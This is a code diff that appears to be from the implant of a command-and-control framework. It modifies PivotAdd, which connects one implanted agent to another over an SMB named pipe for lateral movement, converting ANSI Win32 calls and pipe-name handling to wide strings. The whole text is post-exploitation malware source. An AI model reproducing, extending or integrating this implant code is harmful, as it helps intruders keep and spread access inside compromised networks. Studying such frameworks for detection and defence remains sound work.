@@ -7,23 +7,22 @@
 #include <Core/Command.h>
 #include <Core/Package.h>
 
-BOOL PivotAdd( PCHAR NamedPipe, PVOID* Output, PSIZE_T BytesSize )
+BOOL PivotAdd( LPWSTR NamedPipe, PVOID* Output, PSIZE_T BytesSize )
 {
     PPIVOT_DATA Data    = NULL;
     HANDLE      Handle  = NULL;
-    PARSER      Parser  = { 0 };
 
-    Handle = Instance->Win32.CreateFileA( NamedPipe, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL );
+    Handle = Instance->Win32.CreateFileW( NamedPipe, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL );
 
     if ( ! Handle )
     {
-        PRINTF( "CreateFileA: Failed[%d]\n", NtGetLastError() );
+        PRINTF( "CreateFileW: Failed[%d]\n", NtGetLastError() );
         return FALSE;
     }
 
     if ( NtGetLastError() == ERROR_PIPE_BUSY )
     {
-        if ( ! Instance->Win32.WaitNamedPipeA( NamedPipe, 5000 ) )
+        if ( ! Instance->Win32.WaitNamedPipeW( NamedPipe, 5000 ) )
         {
             return FALSE;
         }
@@ -69,10 +68,8 @@ BOOL PivotAdd( PCHAR NamedPipe, PVOID* Output, PSIZE_T BytesSize )
         Data->Handle      = Handle;
         Data->Next        = NULL;
         Data->DemonID     = PivotParseDemonID( *Output, *BytesSize );
-        Data->PipeName    = Instance->Win32.LocalAlloc( LPTR, StringLengthA( NamedPipe ) );
-        MemCopy( Data->PipeName, NamedPipe, StringLengthA( NamedPipe ) );
-        /*Data->Package     = *Output;
-        Data->PackageSize = *BytesSize;*/
+        Data->PipeName    = Instance->Win32.LocalAlloc( LPTR, StringLengthW( NamedPipe ) * 2 );
+        MemCopy( Data->PipeName, NamedPipe, StringLengthW( NamedPipe ) * 2 );
 
         if ( ! Instance->SmbPivots )
         {
